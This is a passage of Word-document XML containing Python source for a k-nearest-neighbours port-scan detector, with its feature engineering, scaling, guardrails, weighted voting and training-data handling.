    <w:p w14:paraId="6FD52A6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KNNMonitor(DetectionEngine):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FC7FE8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"""K-nearest neighbours classifier for port-scan versus normal traffic.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="167CE79A" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="50CDAEE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Features per one-second interval:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DBB90FB" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1FB5EED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0. unique destination ports</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21975E5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 packet count</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="470AA2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2. ports / packets  (derived)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DFFFE2A" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="60C68D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Feature 2 is engineered rather than measured, and it is what makes the two</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C40139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classes linearly separable. The first two features overlap badly at the</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="013D6F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decision boundary - 27 ports over 160 packets is ordinary browsing while</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CF189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30 ports over 40 packets is a scan, and no threshold on either raw axis</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="492FFFB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separates them. Their ratio does, because it encodes the protocol</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51710A2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behaviour directly: a scanner sends about one SYN per port and never</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="789F11B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completes a handshake, so its ratio approaches 1, whereas a real client</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0976B4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exchanges many packets over a handful of ports and its ratio stays low.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A04EB49" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="19C30C1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The ratio is derived at classification time, so stored training data and</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AB292A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previously saved brain files keep the original [ports, packets, label]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FB136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shape and remain loadable.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C926B1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8242589" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6DC09E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name = "knn"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="119755D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features = ("unique_ports", "packet_count", "ports_per_packet")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75C4D92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MIN_SCAN_PORTS = 10</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BCC2C1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MIN_SCAN_RATIO = 0.20</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02C3ACA6" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="27C304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__init__(self, k=3):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F89711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self.k = k</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56C566A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self.training_data = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DFF53DA" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7740CD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Seed data so we work on first boot. Modern sites can hit</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C250C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10-15 ports easily because of CDNs/ads, so don't go lower.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0467917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14439E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The final four rows cover high-volume / low-port-diversity traffic.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0132D6C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They are labelled Normal because this engine answers exactly one</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1665B3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question - "is this a port scan?" - and a volumetric flood is not one;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="569407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it is the Z-Score engine's responsibility. Without these rows the</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="080284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region is unpopulated, so a 1-port 1500-pps flood falls nearest the</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6395BB0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high-magnitude Scan samples and is misreported as a scan.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02346E4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seed = [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3077943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 5, "Normal"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="767E47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[5, 25, "Normal"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6580F6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[10, 50, "Normal"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F7DCE5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[15, 80, "Normal"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3861B5C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 800, "Normal"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="178742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[2, 2000, "Normal"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B0C0CB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[3, 6000, "Normal"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="585190E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 15000, "Normal"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C3059B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[30, 40, "Scan"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75ED8D2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[50, 60, "Scan"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="354BFCD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[100, 200, "Scan"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F2E78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[500, 1000, "Scan"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74D2990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E456E0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self.training_data.extend(seed)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="589B875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self._ranges = None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61A506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KNN Initialized with %d training samples." % len(self.training_data))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12E9DA51" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3069083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euclidean_distance(self, p1, p2):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="486D78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math.sqrt(sum((a - b) ** 2 for a, b in zip(p1, p2)))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2ABE5C3B" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="63E50E4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feature engineering and scaling --------------------------------</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6561F1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@staticmethod</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="798C7CB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_features(unique_ports, packet_count):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D98D56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"""Build the full feature vector, deriving the ports/packets ratio."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B401D0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ports = float(unique_ports)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35A731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pkts = float(packet_count)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A23A53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[ports, pkts, ports / pkts if pkts &gt; 0 else 0.0]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74851586" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3097B5E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feature_ranges(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="472970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"""Per-feature (min, max) taken from the training set, cached.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BDB1531" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3EC8C2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Euclidean distance is not scale invariant. `packet_count` spans roughly</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36EA0A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5-15000 while `unique_ports` spans 1-500, so an unscaled metric is</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B9E269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dominated almost entirely by the packet count, and the port dimension -</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D3BAE3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the feature that actually defines a scan - contributes almost nothing.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="459797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Min-max normalising every axis onto [0, 1] restores equal weight.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="638C84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0C339D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self._ranges is None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C8E37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self.training_data:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76E11C0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self._ranges = [(0.0, 1.0)] * 3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34FCD2F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else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="623738C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vectors = [self._features(r[0], r[1])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B8946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r in self.training_data]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C5685D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self._ranges = [(min(v[i] for v in vectors),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E5A54C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max(v[i] for v in vectors))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A748E1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 in range(3)]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="147D1E1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self._ranges</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EF8489A" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3605F32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_scale(self, vector):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D4E8D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scaled = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6994F33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value, (low, high) in zip(vector, self.feature_ranges()):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1242F2D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span = high - low</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D6B4A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scaled.append((float(value) - low) / span if span &gt; 0 else 0.0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="080EFD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scaled</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4218B184" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="485EEB6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@classmethod</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C7A59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_is_plausible_scan(cls, ports, pkts):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CBE4C2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ratio = ports / pkts if pkts &gt; 0 else 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B7D64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bool(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="048313E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pkts &gt; 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="339F380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and cls.MIN_SCAN_PORTS &lt;= ports &lt;= pkts</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E34ED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and ratio &gt;= cls.MIN_SCAN_RATIO</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F7553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319AC8F" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6AFDC74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@classmethod</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24D407F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_sanitise_training_data(cls, samples):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7542D9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"""Validate binary KNN rows and repair impossible Scan labels."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="209B77F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cleaned = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="075560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corrected = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="717127D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row in samples:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D11659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isinstance(row, (list, tuple)) or len(row) &lt; 3:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F73955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corrected += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="503526F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continue</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22257F7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1397E3F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ports = float(row[0])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4511CF4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pkts = float(row[1])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="574AA2E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(TypeError, ValueError):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="655746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corrected += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60351E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continue</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70E31E4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math.isfinite(ports) or not math.isfinite(pkts)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="540E90E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or ports &lt; 0 or pkts &lt;= 0 or ports &gt; pkts):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DDA678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corrected += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EC19B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continue</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74747D16" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="33EFA2B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label = "Scan" if str(row[2]).strip().lower() == "scan" else "Normal"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B4110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label == "Scan" and not cls._is_plausible_scan(ports, pkts):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A2D90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label = "Normal"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20FF737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corrected += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02FE8E6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cleaned.append([ports, pkts, label])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AA8DE6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cleaned, corrected</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B68F3FB" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4464B7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classify(self, unique_ports, packet_count):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66E388F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features = self._features(unique_ports, packet_count)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="420A9A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ports, pkts, ratio = features</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BE8B048" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="18BF81D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Semantic guardrails sit in front of the learned classifier. KNN can</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05E5CE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only compare a point with its training data; it does not understand</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C33E9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that zero ports cannot be a port scan. These invariants also protect</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E9386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runtime detection from a mislabeled or incompatible imported brain.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C9C23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self._is_plausible_scan(ports, pkts):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D0DFC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"Normal", []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CA506C4" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="62018AE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point = self._scale(features)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="703BC4D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dists = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FFC74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ports, pkts, label in self.training_data:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="531CBB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 = self.euclidean_distance(point,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="106035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self._scale(self._features(ports, pkts)))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55F420E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dists.append((d, label))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="119EB887" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1119C3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dists.sort(key=lambda x: x[0])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="246EB3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nearest = dists[:self.k]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45DC10AC" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="26787C1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Distance-weighted vote, each neighbour contributing 1/d.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="773D3D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36DF5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Plain majority voting treats all k neighbours as equally</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C7E753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authoritative, so an observation identical to a known Scan sample can</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A633C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still be outvoted by two samples that are further away. Weighting by</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C06C1F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inverse distance makes a closer neighbour count for more, which is</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A4AE9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what resolves the boundary between busy-but-legitimate traffic and a</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36D9BC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slow scan. Epsilon keeps an exact match finite rather than dividing</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A2FE4B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by zero.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A655C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scan_weight = normal_weight = 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D8D15B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d, label in nearest:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4885F2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weight = 1.0 / (d + 1e-9)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55BEAC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label == "Scan":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EEF9B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scan_weight += weight</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="191F3A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else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E0F323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normal_weight += weight</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0807454D" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="19FA471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("Scan" if scan_weight &gt; normal_weight else "Normal"), nearest</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3186B020" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="171F82E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 ---- uniform engine interface (NFR-5) ------------------------------</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EECE7F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analyse(self, unique_ports, packet_count):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="518C2D6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 nearest = self.classify(unique_ports, packet_count)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09B76CA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confidence = share of the k neighbours voting for the winning label</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CCF92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votes = sum(1 for _, lbl in nearest if lbl == verdict)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="222DE76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confidence = votes / float(len(nearest)) if nearest else 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56122A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Verdict(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11F7A43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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64648E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confidence=confidence,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00B7E1E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detail={"unique_ports": unique_ports, "packet_count": packet_count,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2961542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"neighbours": [(round(d, 3), l) for d, l in nearest]},</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15E50B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is_threat=(verdict == "Scan"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F052A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43BCFA5" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1599C10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train(self, samples, max_samples=5000):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="468FD24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"""Store labelled (ports, packets, label) rows; KNN is a lazy learner.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16821335" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="17279AF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Above max_samples the set is down-sampled per class so one dominant</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="656FDC5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label cannot crowd out the minority class in the neighbour vote.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F6549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BC1A76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rows, corrected = self._sanitise_training_data(samples)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F40674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len(rows) &gt; max_samples:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34C6B3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buckets = {}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45D2FCD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row in rows:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A3B78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buckets.setdefault(row[2], []).append(row)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="667CA5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per = max(1, max_samples // max(1, len(buckets)))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56F8BB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kept = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F3DAFC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items in buckets.values():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C8D71C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step = max(1, len(items) // per)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7952F5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kept.extend(items[::step][:per])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EA4D6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rows = kept</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14CBD06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self.training_data = rows</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A071CD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self._ranges = None          # recompute scaling for the new data</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DEA55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counts = Counter(r[2] for r in rows)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11F1F51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print("[KNN] %d samples %s%s"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A53A0C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(len(rows), dict(counts),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="454C126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(%d invalid labels/rows corrected)" % corrected</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="126B4C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corrected else ""))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="396AEB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{"samples": len(rows), "classes": dict(counts),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55C6A67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"corrected": corrected}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40ECC493" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="563E0EB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export_brain(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25C7A87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{"k": self.k, "training_data": self.training_data}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77960410" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5126D42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import_brain(self, data):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59A6674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"training_data" in data:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FD54A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cleaned, corrected = self._sanitise_training_data(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="149497C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data["training_data"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="238E996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cleaned:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="309F2F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KNN brain contained no valid signatures; "</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65E949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"keeping safe built-in seed data.")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41B55BE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False</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6592E9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self.training_data = cleaned</w:t>
